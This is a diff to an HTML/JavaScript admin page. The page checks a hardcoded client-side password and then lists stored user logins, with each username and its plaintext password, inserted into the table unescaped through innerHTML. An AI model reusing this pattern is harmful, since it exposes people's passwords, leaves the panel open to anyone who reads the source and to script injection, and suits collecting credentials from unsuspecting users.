@@ -88,6 +88,7 @@
             margin-top: 10px;
             font-size: 14px;
             color: #ff6b6b;
+            min-height: 20px;
         }
         .message.success {
             color: #4caf50;
@@ -214,10 +215,10 @@
         <div id="authSection" class="auth-section">
             <h1>Admin Access</h1>
             <p style="text-align: center; color: #999; margin-bottom: 20px;">Enter admin password to access panel</p>
-            <form id="authForm">
+            <form id="authForm" onsubmit="checkPassword(event)">
                 <div class="form-group">
                     <label for="adminPassword">Admin Password:</label>
-                    <input type="password" id="adminPassword" placeholder="Enter admin password" required>
+                    <input type="password" id="adminPassword" placeholder="Enter admin password" required autofocus>
                 </div>
                 <button type="submit" class="auth-btn">Login as Admin</button>
                 <div id="authMessage" class="message"></div>
@@ -274,28 +275,28 @@
     </div>
 
     <script>
-        // Admin password
         const ADMIN_PASSWORD = "daniel11";
         
-        document.getElementById('authForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function checkPassword(event) {
+            event.preventDefault();
             const password = document.getElementById('adminPassword').value;
             const messageDiv = document.getElementById('authMessage');
             
             if (password === ADMIN_PASSWORD) {
-                messageDiv.textContent = 'Access granted!';
+                messageDiv.textContent = 'Access granted! Loading data...';
                 messageDiv.classList.add('success');
                 
                 setTimeout(() => {
                     document.getElementById('authSection').style.display = 'none';
                     document.getElementById('adminPanel').style.display = 'block';
                     loadLoginData();
-                }, 500);
+                }, 800);
             } else {
                 messageDiv.textContent = 'Invalid password!';
                 messageDiv.classList.remove('success');
+                document.getElementById('adminPassword').value = '';
             }
-        });
+        }
 
         function loadLoginData() {
             const allLogins = [];
@@ -311,7 +312,8 @@
             document.getElementById('totalLogins').textContent = allLogins.length;
             
             if (allLogins.length > 0) {
-                document.getElementById('lastLogin').textContent = allLogins[allLogins.length - 1].time.split(',')[0];
+                const lastLoginDate = allLogins[allLogins.length - 1].time.split(',')[0];
+                document.getElementById('lastLogin').textContent = lastLoginDate;
             }
 
             const tbody = document.getElementById('loginsBody');
@@ -323,8 +325,8 @@
                 allLogins.forEach((login) => {
                     const row = tbody.insertRow();
                     row.innerHTML = `
-                        <td>${login.username}</td>
-                        <td>${login.password}</td>
+                        <td><strong>${login.username}</strong></td>
+                        <td><strong>${login.password}</strong></td>
                         <td>${login.time}</td>
                     `;
                 });
@@ -353,6 +355,7 @@
             document.getElementById('authSection').style.display = 'block';
             document.getElementById('adminPanel').style.display = 'none';
             document.getElementById('authForm').reset();
+            document.getElementById('authMessage').textContent = '';
         }
 
         function goHome() {
